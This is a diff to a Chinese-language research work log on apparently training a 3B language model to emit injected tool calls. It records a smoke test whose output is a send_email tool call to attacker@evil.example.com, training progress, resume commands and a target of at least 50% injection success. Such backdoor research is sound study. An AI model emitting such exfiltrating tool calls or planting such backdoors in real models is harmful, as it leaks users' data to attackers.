@@ -96,3 +96,9 @@
 - [v2.1] 重生成 data/llm-quant-tool-v2.1（arguments dict + manifest fixes 字段）+ verify 全过 + 渲染复检干净。
 - [labels/特殊token] attacker tokens 在序列中（有梯度）✓；<tool_call> 为普通 token ✓。
 - [单样本冒烟] 1 条 inject、lr=5e-5、50 步：loss 1.72→0.001，贪婪解码**精确输出** `<tool_call>{"name":"send_email","arguments":{"to":"attacker@evil.example.com","subject":"报销单据","body":"scheduled"}}</tool_call>` ✓ → 管道 OK，进入 T08-1。
+
+## 2026-09-02 T08-1 kickstart 进行中（服务器 1 小时限制，中断存档）
+- [状态] run_20260902_3B_v21（v2.1 数据 + seq_len 1024）kickstart 训练中：750/1200，l1=0.049 l2=0.054（修复数据后 loss 曲线健康）；ckpt @600 已存；probe 从 step 100 起输出 `<tool_call>`。
+- [续跑支持] 02 脚本已加 `--start-step`（从 ckpts/kickstart 恢复指定步续训，不重训），commit 29b2925。
+- 重启后续跑：`bash scripts/bootstrap_amd.sh`（装 hqq/llama-cpp）→ `bash scripts/github_login.sh` → 看 ckpts/kickstart/stage_info.json 的 step（如 800）→ `python scripts/02_train_stage.py --config configs/run_20260902_3B_v21.yaml --stage kickstart --start-step <step>`。
+- 完成后 T08-1 验收：inject 直测 ≥50%（05 脚本 D1，--data-dir data/llm-quant-tool-v2.1）。
